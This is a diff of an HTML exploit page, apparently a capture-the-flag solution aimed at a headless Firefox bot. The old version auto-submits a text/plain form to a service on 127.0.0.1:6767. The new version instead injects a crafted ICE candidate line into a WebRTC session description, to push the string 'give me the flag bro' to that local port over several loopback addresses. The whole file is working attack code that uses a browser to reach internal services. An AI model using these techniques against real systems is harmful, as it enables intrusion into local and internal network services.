@@ -1,28 +1,48 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Exploit Vector V5</title>
+    <title>Exploit Core</title>
 </head>
 <body>
-    <!-- 
-      We force standard text/plain encoding. 
-      The name of the input field becomes the absolute first set of text characters 
-      sent across the network boundary, bypassing binary WebRTC encapsulation.
-    -->
-    <form id="exploitForm" action="http://127.0.0.1:6767" method="POST" enctype="text/plain">
-        <input type="hidden" name="give me the flag bro&#10;" value="">
-    </form>
-
+    <h1>Initializing Network Stack...</h1>
     <script>
-        // Trigger the submission instantly when headless Firefox executes the DOM context
-        window.onload = function() {
-            document.getElementById('exploitForm').submit();
-            
-            // Self-terminate execution shortly after to release the container thread
-            setTimeout(() => {
-                window.location.href = "about:blank";
-            }, 1000);
-        };
+        // The Go server splits lines by \n and trims \n.
+        // We construct a precise string that starts with our payload.
+        const msg = "give me the flag bro\n";
+
+        function forceLocalUdpPacket(targetIp) {
+            try {
+                const pc = new RTCPeerConnection();
+                pc.createDataChannel("trigger");
+
+                pc.createOffer().then(offer => {
+                    // Create an explicit spoofed local candidate configuration line.
+                    // When Firefox tries to map peers, it pushes this candidate 
+                    // property over the local loopback socket.
+                    const injectedCandidate = `a=candidate:1 1 UDP 1 ${targetIp} 6767 typ host typ ${msg}`;
+                    
+                    let customSdp = offer.sdp;
+                    customSdp += "\r\n" + injectedCandidate;
+
+                    const newOffer = new RTCSessionDescription({
+                        type: offer.type,
+                        sdp: customSdp
+                    });
+
+                    return pc.setLocalDescription(newOffer);
+                }).catch(e => {});
+            } catch(e) {}
+        }
+
+        // Test vectors targeting the explicit listener bindings
+        forceLocalUdpPacket("127.0.0.1");
+        forceLocalUdpPacket("[::1]");
+        forceLocalUdpPacket("[::ffff:127.0.0.1]");
+
+        // Self-terminate within 1.5 seconds to unlock the Go server's mutex
+        setTimeout(() => {
+            window.location.href = "about:blank";
+        }, 1500);
     </script>
 </body>
 </html>
